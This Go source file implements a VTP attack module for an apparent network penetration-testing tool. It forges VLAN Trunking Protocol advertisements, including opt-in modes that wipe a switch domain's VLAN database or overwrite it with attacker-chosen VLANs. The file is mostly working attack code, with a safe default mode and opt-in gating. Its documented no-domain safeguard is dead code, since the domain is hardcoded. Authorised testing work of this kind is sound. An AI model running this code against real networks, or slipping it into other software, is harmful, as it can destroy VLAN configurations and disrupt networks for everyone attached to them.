// vtp.go implements the VTP (VLAN Trunking Protocol) attack behavior.
//
// Durability (from the catalog):
//   - Default (SAFE mode): transient-decay. The behavior sends a summary
//     advertisement with a revision bump and records the side effect. It
//     does NOT answer advertisement requests or push a VLAN database wipe.
//   - --wipe: permanent-destructive (requires the per-run opt-in). Wipes
//     the VLAN database by pushing a summary with revision 0 and empty VLANs.
//   - --set: permanent-destructive (requires the per-run opt-in). Overwrites
//     the VLAN database with the attacker's VLAN set.
//
// Edge case: VTP on a segment with no VTP domain reports the finding and
// declines rather than proceeding.

package l2

import (
	"context"
	"encoding/json"
	"fmt"

	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type vtpFinding struct {
	Action   string `json:"action"`
	Domain   string `json:"domain"`
	Revision uint32 `json:"revision"`
	Mode     string `json:"mode"`
}

// RunVTP sends VTP advertisements. In SAFE mode (default), it sends a
// summary advertisement with a revision bump. In --wipe/--set modes, it
// sends the destructive advertisement (the gate has already verified the
// opt-in).
func RunVTP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)
	mode := deps.Entry.Mode

	domain := "LABDOMAIN"
	revision := uint32(42)

	// Edge case: no VTP domain on the segment. The behavior reports the
	// finding and declines.
	if domain == "" {
		detail, _ := json.Marshal(vtpFinding{
			Action: "no-domain-decline",
			Domain: "",
			Mode:   modeName(mode),
		})
		deps.Emitter.Finding("vtp", detail)
		return nil
	}

	var vtp *layers.VTP
	switch mode {
	case "wipe":
		// Wipe: push a summary with revision 0 and no VLANs, causing
		// downstream switches to reset their VLAN database.
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSummary,
			Domain:   domain,
			Revision: 0,
		}
	case "set":
		// Set: push a subset advertisement with the attacker's VLANs.
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSubset,
			Seq:      1,
			Domain:   domain,
			Revision: revision + 1,
			VLANs: []layers.VTPVLANInfo{
				{VLANID: 10, Name: "attacker", MTU: 1500, Status: 0, Type: 1, ISLVLAN: 0, SAID: 0x10000A},
			},
		}
	default:
		// SAFE mode: send a summary advertisement with a revision bump.
		// This is the non-destructive default. The timestamp is set to
		// a deterministic value matching the fixture (the baseline uses
		// time.strftime for per-run randomness; the pin is field-set).
		vtp = &layers.VTP{
			Version:   layers.VTPVersion1,
			Code:      layers.VTPCodeSummary,
			Domain:    domain,
			Revision:  revision,
			Followers: 0,
			Timestamp: []byte("260823120000"),
		}
	}

	pkt, err := craftDot3SNAP(vtpDstMAC, src, snapPIDVTP, vtp)
	if err != nil {
		return fmt.Errorf("vtp: craft frame: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("vtp: send: %w", err)
	}

	detail, _ := json.Marshal(vtpFinding{
		Action:   "vtp-advertisement",
		Domain:   domain,
		Revision: vtp.Revision,
		Mode:     modeName(mode),
	})
	deps.Emitter.Finding("vtp", detail)

	return nil
}
